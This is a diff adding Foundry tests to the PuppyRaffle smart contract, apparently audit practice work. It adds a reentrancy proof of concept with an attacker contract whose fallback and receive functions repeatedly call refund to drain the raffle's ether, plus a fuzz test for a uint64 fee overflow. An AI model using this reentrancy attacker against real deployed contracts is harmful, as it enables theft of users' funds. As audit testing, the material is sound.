@@ -243,4 +243,87 @@ contract PuppyRaffleTest is Test {
 
         assert(gasFirst < gasSecond);
     }
+
+    function test_Reentrancy_refund() public {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        ReentrancyAttacker attackerContract = new ReentrancyAttacker(address(puppyRaffle));
+        address attackUser = makeAddr("attackUser");
+        vm.deal(attackUser, 1 ether);
+
+        uint256 StartingContractBalance = address(puppyRaffle).balance;
+        uint256 StartingAttackerContractBalance = address(attackerContract).balance;
+
+        vm.prank(attackUser);
+        attackerContract.attack{value: entranceFee}();
+
+        console.log("Starting Contract Balance: ", StartingContractBalance);
+        console.log("Starting Attacker Contract Balance: ", StartingAttackerContractBalance);
+
+        console.log("Ending Contract Balance: ", address(puppyRaffle).balance);
+        console.log("Ending Attacker Contract Balance: ", address(attackerContract).balance);
+    }
+
+    function test_FuzzTotalFeesOverflow(uint256 numPlayers, uint256 _entranceFee) public {
+        // bound inputs to realistic ranges
+        numPlayers = bound(numPlayers, 4, 1000);
+        _entranceFee = bound(_entranceFee, 1e18, 1e18);
+
+        uint256 totalAmountCollected = numPlayers * entranceFee;
+        uint256 fee = (totalAmountCollected * 20) / 100;
+
+        uint64 castedFee = uint64(fee);
+        uint256 lostFees = fee - uint256(castedFee);
+
+        if (uint256(castedFee) != fee) {
+            console.log("--- OVERFLOW DETECTED ---");
+            console.log("players     :", numPlayers);
+            console.log("entranceFee :", _entranceFee);
+            console.log("actual fee  :", fee);
+            console.log("truncated   :", uint256(castedFee));
+            console.log("lost        :", lostFees);
+        }
+
+        assertEq(uint256(castedFee), fee, "Overflow: uint64 cast truncated fee");
+    }
+}
+
+contract ReentrancyAttacker {
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee;
+    uint256 attackerIndex;
+
+    constructor(address _puppyRaffle) {
+        puppyRaffle = PuppyRaffle(_puppyRaffle);
+        entranceFee = puppyRaffle.entranceFee();
+    }
+
+    function attack() external payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+
+        puppyRaffle.refund(attackerIndex);
+    }
+
+    function _stealMoney() public {
+        if (address(puppyRaffle).balance >= entranceFee) {
+            puppyRaffle.refund(attackerIndex);
+        }
+    }
+
+    fallback() external payable {
+        _stealMoney();
+    }
+
+    receive() external payable {
+        _stealMoney();
+    }
 }
